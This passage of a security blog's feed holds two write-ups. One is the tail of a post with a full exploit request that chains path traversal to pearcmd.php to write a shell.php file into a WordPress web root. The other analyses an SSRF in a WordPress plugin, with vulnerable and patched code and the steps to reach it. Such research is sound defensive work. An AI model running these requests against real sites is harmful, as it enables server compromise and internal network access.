4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;T·∫≠n d·ª•ng &lt;a href=&#34;https://w41bu1.github.io/2025-10-13-cve-2025-48293/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-48293&lt;/a&gt; ƒë√£ ph√¢n t√≠ch ƒë·ªÉ khai th√°c m·ªü r·ªông b·∫±ng &lt;code&gt;pearcmd.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;G·ª≠i request ch·ª©a LFI payload tr·ªè ƒë·∫øn &lt;code&gt;pearcmd.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=geo_mashup_query&amp;amp;object_ids=2&amp;amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;amp;&amp;#43;config-create&amp;#43;/&amp;lt;?=phpinfo();?&amp;gt;&amp;#43;/var/www/html/shell.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/wp-admin/&#xA;Connection: keep-alive&#xA;Upgrade-Insecure-Requests: 1&#xA;Sec-Fetch-Dest: document&#xA;Sec-Fetch-Mode: navigate&#xA;Sec-Fetch-Site: same-origin&#xA;Sec-Fetch-User: ?1&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0, i&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Response tr·∫£ v·ªÅ th√†nh c√¥ng&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png&#34; title=&#34;Response tr·∫£ v·ªÅ th√†nh c√¥ng&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png&#34; data-sub-html=&#34;&lt;h2&gt;res2&lt;/h2&gt;&lt;p&gt;Response tr·∫£ v·ªÅ th√†nh c√¥ng&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png&#39; alt=&#34;res2&#34; height=&#34;937&#34; width=&#34;1536&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Response tr·∫£ v·ªÅ th√†nh c√¥ng&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Truy c·∫≠p &lt;code&gt;shell.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png&#34; title=&#34;shell.php&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png&#34; data-sub-html=&#34;&lt;h2&gt;shell&lt;/h2&gt;&lt;p&gt;shell.php&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png&#39; alt=&#34;shell&#34; height=&#34;1078&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;shell.php&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11361 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-22-cve-2025-11361/</link>
      <pubDate>Wed, 22 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-22-cve-2025-11361/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-22-cve-2025-11361/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Gutenberg Essential Blocks ‚Äì Page Builder for Gutenberg Blocks &amp;amp; Patterns&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; b·ªã l·ªó h·ªïng &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n l√™n t·ªõi v√† bao g·ªìm &lt;strong&gt;5.7.1&lt;/strong&gt;, th√¥ng qua h√†m &lt;strong&gt;eb_save_ai_generated_image&lt;/strong&gt;.&lt;br&gt;&#xA;ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c, c√≥ quy·ªÅn &lt;strong&gt;Author-level&lt;/strong&gt; tr·ªü l√™n, th·ª±c hi·ªán c√°c y√™u c·∫ßu web t·ªõi b·∫•t k·ª≥ ƒë·ªãa ch·ªâ n√†o xu·∫•t ph√°t t·ª´ ·ª©ng d·ª•ng web v√† c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ truy v·∫•n v√† ch·ªânh s·ª≠a th√¥ng tin t·ª´ c√°c d·ªãch v·ª• n·ªôi b·ªô.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11361&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11361&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.7.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.7.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Author&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/essential-blocks/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Essential Blocks for Gutenberg Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Essential Blocks for Gutenberg&lt;/strong&gt;: &lt;strong&gt;5.7.1&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;5.7.2&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;B·∫£n l·ªói&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function eb_save_ai_generated_image()&#xA;{&#xA;    if ( ! isset( $_POST[ &amp;#39;admin_nonce&amp;#39; ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ &amp;#39;admin_nonce&amp;#39; ] ), &amp;#39;admin-nonce&amp;#39; ) ) {&#xA;        wp_send_json_error( __( &amp;#39;Nonce Error&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;    }&#xA;    if ( ! current_user_can( &amp;#39;upload_files&amp;#39; ) ) {&#xA;        wp_send_json_error( __( &amp;#39;You are not authorized to upload files!&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;    }&#xA;    // Check if we have either image_url or image_b64 along with prompt&#xA;    if ( ( isset( $_POST[ &amp;#39;image_url&amp;#39; ] ) || isset( $_POST[ &amp;#39;image_b64&amp;#39; ] ) ) &amp;amp;&amp;amp; isset( $_POST[ &amp;#39;prompt&amp;#39; ] ) ) {&#xA;        $image_url   = isset( $_POST[ &amp;#39;image_url&amp;#39; ] ) ? esc_url_raw( $_POST[ &amp;#39;image_url&amp;#39; ] ) : null;&#xA;        $image_body = &amp;#39;&amp;#39;;&#xA;        // Handle URL format&#xA;        if ( $image_url ) {&#xA;            // Download the image from OpenAI URL&#xA;            $image_data = wp_remote_get( $image_url, [&#xA;                &amp;#39;timeout&amp;#39; =&amp;gt; 60&#xA;                ] );&#xA;            if ( is_wp_error( $image_data ) ) {&#xA;                wp_send_json_error( [&#xA;                    &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Failed to download image from OpenAI.&amp;#39;, &amp;#39;essential-blocks&amp;#39; )&#xA;                    ] );&#xA;                return;&#xA;            }&#xA;            // Detect image format and set appropriate extension and MIME type&#xA;            $image_info = getimagesizefromstring( $image_body );&#xA;            $mime_type  = $image_info ? $image_info[ &amp;#39;mime&amp;#39; ] : &amp;#39;image/png&amp;#39;;&#xA;&#xA;            // Determine file extension based on MIME type&#xA;            $extension = &amp;#39;png&amp;#39;; // default&#xA;            switch ( $mime_type ) {&#xA;                case &amp;#39;image/jpeg&amp;#39;:&#xA;                    $extension = &amp;#39;jpg&amp;#39;;&#xA;                    break;&#xA;                case &amp;#39;image/png&amp;#39;:&#xA;                    $extension = &amp;#39;png&amp;#39;;&#xA;                    break;&#xA;                case &amp;#39;image/webp&amp;#39;:&#xA;                    $extension = &amp;#39;webp&amp;#39;;&#xA;                    break;&#xA;                case &amp;#39;image/gif&amp;#39;:&#xA;                    $extension = &amp;#39;gif&amp;#39;;&#xA;                    break;&#xA;            }&#xA;            $image_body = wp_remote_retrieve_body( $image_data );&#xA;        }&#xA;        // other logic&#xA;    } else {&#xA;        wp_send_json_error( __( &amp;#39;Image data (URL or base64) and prompt are required&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n l·ªói, s·ª≠ d·ª•ng &lt;code&gt;wp_remote_get($image_url)&lt;/code&gt; ƒë·ªÉ t·∫£i h√¨nh ·∫£nh m√† kh√¥ng x√°c th·ª±c ho·∫∑c gi·ªõi h·∫°n ngu·ªìn URL. Kh√¥ng ki·ªÉm tra m√£ ph·∫£n h·ªìi HTTP, MIME type hay n·ªôi dung th·ª±c t·∫ø c·ªßa t·ªáp tr·∫£ v·ªÅ, khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng g·ª≠i y√™u c·∫ßu SSRF ƒë·∫øn c√°c d·ªãch v·ª• n·ªôi b·ªô ho·∫∑c t·∫£i v·ªÅ d·ªØ li·ªáu ƒë·ªôc h·∫°i gi·∫£ d·∫°ng h√¨nh ·∫£nh.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√°&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function eb_save_ai_generated_image()&#xA;{&#xA;    if ( ! isset( $_POST[ &amp;#39;admin_nonce&amp;#39; ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ &amp;#39;admin_nonce&amp;#39; ] ), &amp;#39;admin-nonce&amp;#39; ) ) {&#xA;        wp_send_json_error( __( &amp;#39;Nonce Error&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;    }&#xA;    if ( ! current_user_can( &amp;#39;upload_files&amp;#39; ) ) {&#xA;        wp_send_json_error( __( &amp;#39;You are not authorized to upload files!&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;    }&#xA;    // Check if we have either image_url or image_b64 along with prompt&#xA;    if ( ( isset( $_POST[ &amp;#39;image_url&amp;#39; ] ) || isset( $_POST[ &amp;#39;image_b64&amp;#39; ] ) ) &amp;amp;&amp;amp; isset( $_POST[ &amp;#39;prompt&amp;#39; ] ) ) {&#xA;        $image_url   = isset( $_POST[ &amp;#39;image_url&amp;#39; ] ) ? esc_url_raw( $_POST[ &amp;#39;image_url&amp;#39; ] ) : null;&#xA;        $image_body = &amp;#39;&amp;#39;;&#xA;        // Handle URL format&#xA;        if ( $image_url ) {&#xA;            // Download the image from validated URL&#xA;            $image_data = wp_safe_remote_get( $image_url, [&#xA;                &amp;#39;timeout&amp;#39;     =&amp;gt; 30,&#xA;                &amp;#39;redirection&amp;#39; =&amp;gt; 3,&#xA;                &amp;#39;user-agent&amp;#39;  =&amp;gt; &amp;#39;Essential Blocks/&amp;#39; . ESSENTIAL_BLOCKS_VERSION,&#xA;                &amp;#39;headers&amp;#39;     =&amp;gt; [&#xA;                    &amp;#39;Accept&amp;#39; =&amp;gt; &amp;#39;image/*&amp;#39;&#xA;                    ]&#xA;                ] );&#xA;            if ( is_wp_error( $image_data ) ) {&#xA;                wp_send_json_error( [&#xA;                    &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Failed to download image from URL.&amp;#39;, &amp;#39;essential-blocks&amp;#39; )&#xA;                    ] );&#xA;                return;&#xA;            }&#xA;            // Validate response&#xA;            $response_code = wp_remote_retrieve_response_code( $image_data );&#xA;            if ( $response_code !== 200 ) {&#xA;                wp_send_json_error( [&#xA;                    &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Invalid response from image URL.&amp;#39;, &amp;#39;essential-blocks&amp;#39; )&#xA;                    ] );&#xA;                return;&#xA;            }&#xA;            // Security: Validate image content and size&#xA;            if ( ! $this-&amp;gt;is_valid_image_content( $image_body ) ) {&#xA;                wp_send_json_error( [&#xA;                    &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Invalid image content provided.&amp;#39;, &amp;#39;essential-blocks&amp;#39; )&#xA;                 ] );&#xA;                return;&#xA;            }&#xA;            // Detect image format and set appropriate extension and MIME type&#xA;            $image_info = getimagesizefromstring( $image_body );&#xA;            if ( ! $image_info ) {&#xA;                wp_send_json_error( [&#xA;                    &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Unable to determine image format.&amp;#39;, &amp;#39;essential-blocks&amp;#39; )&#xA;                 ] );&#xA;                return;&#xA;            }&#xA;&#xA;            $mime_type = $image_info[ &amp;#39;mime&amp;#39; ];&#xA;&#xA;            // Security: Only allow specific image MIME types&#xA;            $allowed_mime_types = [&#xA;                &amp;#39;image/jpeg&amp;#39;,&#xA;                &amp;#39;image/png&amp;#39;,&#xA;                &amp;#39;image/webp&amp;#39;,&#xA;                &amp;#39;image/gif&amp;#39;&#xA;             ];&#xA;&#xA;            if ( ! in_array( $mime_type, $allowed_mime_types, true ) ) {&#xA;                wp_send_json_error( [&#xA;                    &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Unsupported image format.&amp;#39;, &amp;#39;essential-blocks&amp;#39; )&#xA;                 ] );&#xA;                return;&#xA;            }&#xA;            $image_body = wp_remote_retrieve_body( $image_data );&#xA;        }&#xA;        // other logic&#xA;    } else {&#xA;        wp_send_json_error( __( &amp;#39;Image data (URL or base64) and prompt are required&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° thay &lt;code&gt;wp_remote_get()&lt;/code&gt; b·∫±ng &lt;code&gt;wp_safe_remote_get()&lt;/code&gt; ƒë·ªÉ ch·∫∑n truy c·∫≠p ƒë·∫øn ƒë·ªãa ch·ªâ n·ªôi b·ªô, th√™m ki·ªÉm tra m√£ ph·∫£n h·ªìi HTTP, x√°c th·ª±c n·ªôi dung v√† ƒë·ªãnh d·∫°ng h√¨nh ·∫£nh (&lt;code&gt;is_valid_image_content()&lt;/code&gt;, gi·ªõi h·∫°n MIME h·ª£p l·ªá), ƒë·ªìng th·ªùi gi·∫£m timeout v√† redirect nh·∫±m tƒÉng c∆∞·ªùng an to√†n ‚Äî qua ƒë√≥ ngƒÉn ch·∫∑n ho√†n to√†n kh·∫£ nƒÉng SSRF v√† x·ª≠ l√Ω d·ªØ li·ªáu ph·∫£n h·ªìi m·ªôt c√°ch an to√†n.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private function is_valid_image_content( $image_data )&#xA;{&#xA;    if ( empty( $image_data ) ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Check file size (max 10MB)&#xA;    $max_size = 10 * 1024 * 1024; // 10MB&#xA;    if ( strlen( $image_data ) &amp;gt; $max_size ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Validate image using getimagesizefromstring&#xA;    $image_info = getimagesizefromstring( $image_data );&#xA;    if ( ! $image_info ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Check image dimensions (reasonable limits)&#xA;    $max_width  = 4096;&#xA;    $max_height = 4096;&#xA;    if ( $image_info[ 0 ] &amp;gt; $max_width || $image_info[ 1 ] &amp;gt; $max_height ) {&#xA;        return false;&#xA;    }&#xA;&#xA;    // Additional security: Check for suspicious content patterns&#xA;    // Look for common file signatures that shouldn&amp;#39;t be in images&#xA;    $suspicious_patterns = [&#xA;        &amp;#39;&amp;lt;?php&amp;#39;, // PHP code&#xA;        &amp;#39;&amp;lt;script&amp;#39;, // JavaScript&#xA;        &amp;#39;javascript:&amp;#39;, // JavaScript protocol&#xA;        &amp;#39;data:text/&amp;#39;, // Text data URLs&#xA;        &amp;#39;&amp;lt;html&amp;#39;, // HTML content&#xA;        &amp;#39;#!/bin/&amp;#39; // Shell scripts&#xA;        ];&#xA;&#xA;    $data_start = substr( $image_data, 0, 1024 ); // Check first 1KB&#xA;    foreach ( $suspicious_patterns as $pattern ) {&#xA;        if ( stripos( $data_start, $pattern ) !== false ) {&#xA;            return false;&#xA;        }&#xA;    }&#xA;&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;eb_save_ai_generated_image()&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho action hook, v·ªõi hook name &lt;code&gt;wp_ajax_save_ai_generated_image&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_save_ai_generated_image&amp;#39;, [ $this, &amp;#39;eb_save_ai_generated_image&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T·ª©c khi truy c·∫≠p endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=save_ai_generated_image&lt;/code&gt; th√¨ &lt;code&gt;eb_save_ai_generated_image()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi.&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªÉ &lt;code&gt;wp_remote_get()&lt;/code&gt; ƒë∆∞·ª£c th·ª±c thi, ta c·∫ßn v∆∞·ª£t qua c√°c ƒëi·ªÅu ki·ªán sau:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;check &lt;code&gt;admin_nonce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! isset( $_POST[ &amp;#39;admin_nonce&amp;#39; ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ &amp;#39;admin_nonce&amp;#39; ] ), &amp;#39;admin-nonce&amp;#39; ) ) {&#xA;    wp_send_json_error( __( &amp;#39;Nonce Error&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;M·∫∑c ƒë·ªãnh khi truy c·∫≠p &lt;code&gt;wp-admin&lt;/code&gt;, &lt;code&gt;admin_nonce&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c set, c√≥ th·ªÉ t√¨m th·∫•y b·∫±ng c√°ch inspect code v√† t√¨m v·ªõi t·ª´ kh√≥a &lt;code&gt;admin_nonce&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-22-cve-2025-11361/admin_nonce.png&#34;&#xA;    alt=&#34;T√¨m admin_nonce b·∫±ng c√°ch inspect code&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;T√¨m &lt;code&gt;admin_nonce&lt;/code&gt; b·∫±ng c√°ch inspect code&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Check user-level&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;upload_files&amp;#39; ) ) {&#xA;    wp_send_json_error( __( &amp;#39;You are not authorized to upload files!&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;upload_files&lt;/code&gt; y√™u c·∫ßu user Author-level tr·ªü l√™n&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;POST request&lt;/code&gt; ch·ª©a &lt;code&gt;image_url&lt;/code&gt; v√† &lt;code&gt;prompt&lt;/code&gt; param.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ( isset( $_POST[ 